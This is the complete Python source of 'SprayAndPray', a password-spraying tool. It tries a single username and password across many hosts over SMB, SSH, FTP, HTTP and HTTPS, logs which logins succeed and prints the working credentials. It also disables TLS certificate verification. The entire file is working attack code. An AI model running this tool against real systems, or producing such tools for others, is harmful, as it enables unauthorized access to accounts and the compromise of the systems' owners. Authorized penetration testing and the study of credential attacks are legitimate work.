#!/usr/bin/python

import time
import ftplib
import getpass
import requests
import argparse
import telnetlib
from pexpect import pxssh
from requests.auth import HTTPBasicAuth
from smb.SMBConnection import SMBConnection

# Needed to keep requests from complaining about SSL
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()



# Template for new services
def spray_dummy():
	global good_creds, bad_creds, servers, username, password
	for server in servers:
		print("Attempting DUMMY login -  %s:%s@%s" % (username, password, server))

# Try SMB login
def spray_smb():
	global good_creds, bad_creds, servers, username, password
	for server in servers:
		print("Attempting SMB login -  %s:%s@%s" % (username, password, server))
		conn = SMBConnection(username, password, 'clientname', 'servername', use_ntlm_v2 = True)
		try:
			conn.connect(server, 139, timeout=10)
			print("  SMB login succeeded!")
			good_creds.append(("SMB",server,username,password))
		except :
			print("  SMB login failed...")
			bad_creds.append(("SMB",server,username,password))

# Try SSH login
def spray_ssh():
	global good_creds, bad_creds, servers, username, password
	for server in servers:
		print("Attempting SSH login -  %s:%s@%s" % (username, password, server))
		try:
			s = pxssh.pxssh()
			s.login(server, username, password)
			print("  SSH login succeeded!")
			good_creds.append(("SSH",server,username,password))
		except:
			print("  SSH login failed...")
			bad_creds.append(("SSH",server,username,password))

# Try FTP login
def spray_ftp():
	global good_creds, bad_creds, servers, username, password
	for server in servers:
		print("Attempting FTP login - %s:%s@%s" % (username, password, server))
		try:
			ftp = ftplib.FTP(server, username, password, timeout=10)
			print("  FTP login succeeded!")
			good_creds.append(("FTP",server,username,password))
		except:
			print("  FTP login failed...")
			bad_creds.append(("FTP",server,username,password))

# Need some help here - anyone know of a standard way to detect Telnet login outcome?
# Try Telnet login
def spray_telnet():
	global good_creds, bad_creds, servers, username, password
	for server in servers:
		print("Attempting Telnet login - %s:%s@%s" % (username, password, server))
		try:
			tn = telnetlib.Telnet(server, timeout=10)
			time.sleep(1)
			tn.write(username + "\n")
			time.sleep(1)
			tn.write(password + "\n")
			time.sleep(1)
			print("  Telnet login succeeded!")
			good_creds.append(("Telnet",server,username,password))
		except:
			print("  Telnet login failed...")
			bad_creds.append(("Telnet",server,username,password))

# Try HTTP login
def spray_http():
	global good_creds, bad_creds, servers, username, password
	for server in servers:
		print("Attempting HTTP login - %s:%s@%s" % (username, password, server))
		try:
			r = requests.get('http://' + server, auth=HTTPBasicAuth(username, password))
		except:
			print("  HTTPS appears to be in use, trying that instead...")
			r = requests.get('https://' + server, auth=HTTPBasicAuth(username, password), verify=False)
			if r.status_code == 401:
				print("  HTTPS login failed...")
				bad_creds.append(("HTTPS",server,username,password))
				continue
			else:
				print("  HTTPS login succeeded!")
				good_creds.append(("HTTPS",server,username,password))
				continue
		if r.status_code == 401:
			print("  HTTP login failed...")
			bad_creds.append(("HTTP",server,username,password))
		else:
			print("  HTTP login succeeded!")
			good_creds.append(("HTTP",server,username,password))

# Try HTTPS login
def spray_https():
	global good_creds, bad_creds, servers, username, password
	for server in servers:
		print("Attempting HTTPS login - %s:%s@%s" % (username, password, server))
		try:
			r = requests.get('https://' + server, auth=HTTPBasicAuth(username, password), verify=False)
		except:
			print("  HTTP appears to be in use, trying that instead...")
			r = requests.get('http://' + server, auth=HTTPBasicAuth(username, password))
			if r.status_code == 401:
				print("  HTTP login failed...")
				bad_creds.append(("HTTP",server,username,password))
				continue
			else:
				print("  HTTP login succeeded!")
				good_creds.append(("HTTP",server,username,password))
				continue
		if r.status_code == 401:
			print("  HTTPS login failed...")
			bad_creds.append(("HTTPS",server,username,password))
		else:
			print("  HTTPS login succeeded!")
			good_creds.append(("HTTPS",server,username,password))



##########
#  Main  #
##########
if __name__ == "__main__":
	banner = """
 ~~~~~~~~~~~~~~~~~~~~~~~~~
/   SprayAndPray v0.2.0   \\
\      by @TactiFail      /
 +++++++++++++++++++++++++
"""
	print(banner)

	# Parse args
	parser = argparse.ArgumentParser(
	description = 'Multi-protocol password-spraying tool',
	usage = __file__ + " -s <servers> -u <user> [-t <protocols>] [-p <password>]",
	epilog = "Example: " + __file__ + " -s 192.168.1.100 -u root -t smb,ssh -p Winter2017",
	formatter_class=argparse.RawTextHelpFormatter)

	parser._action_groups.pop()
	required = parser.add_argument_group('Required arguments')
	optional = parser.add_argument_group('Optional arguments')
	required.add_argument('-s', dest="servers", help="Comma-separated list of IPs or hostnames to spray against", required=True)
	required.add_argument('-u', dest="username", help="Username to spray", required=True)
	optional.add_argument('-p', dest="password", help="Password to spray (will be prompted if missing or empty)", nargs="?")
	optional.add_argument('-t', dest="protocols", help="""Comma-separated list of protocols to test (defaults to all)
	Supported options: all,smb,ssh,ftp,http,https""", default="all")
	optional.add_argument('-b', dest="show_bad", help="Display bad passwords as well as good", action='store_true', default=False)

	args = parser.parse_args()
	(servers, username, password, protocols, show_bad) = (set(args.servers.split(',')), args.username, args.password, set(args.protocols.split(',')), args.show_bad)

	if password == None:
		password = getpass.getpass("Enter the password to spray: ")
		print("")

	# Print out run parameters
	print("  Servers:   %s" % ', '.join(servers))
	print("  User:      %s" % username)
	print("  Pass:      %s" % password)
	print("  Protocols: %s" % ', '.join(protocols))
	print("")

	good_creds = []
	bad_creds  = []

	# Loop over all protocols
	if "all" in list(protocols):
		print("Spraying against all protocols...\n")
		spray_smb()
		spray_ssh()
		spray_ftp()
		#spray_telnet()
		spray_https()
		spray_http()
	else:
		print("Spraying against %s.\n" % ', '.join(protocols))
		for protocol in protocols:
			if protocol.lower() == "dummy":
				spray_dummy()
			elif protocol.lower() == "smb":
				spray_smb()
			elif protocol.lower() == "ssh":
				spray_ssh()
			elif protocol.lower() == "ftp":
				spray_ftp()
			#elif protocol.lower() == "telnet":
				#spray_telnet()
			elif protocol.lower() == "https":
				spray_https()
			elif protocol.lower() == "http":
				spray_http()
			else:
				print("Unknown protocol %s, skipping." % protocol.lower())

	# Print good creds, if any
	if good_creds:
		print("\nSummary of working credentials (protocol, hostname, username, password):\n")
		for cred in set(good_creds):
			print(cred)
	else:
		print("\nNo credentials worked  :(")

	if show_bad:
		if bad_creds:
			print("\nSummary of failing credentials (protocol, hostname, username, password):\n")
			for cred in set(bad_creds):
				print(cred)
		else:
			print("\nAll credentials worked!")
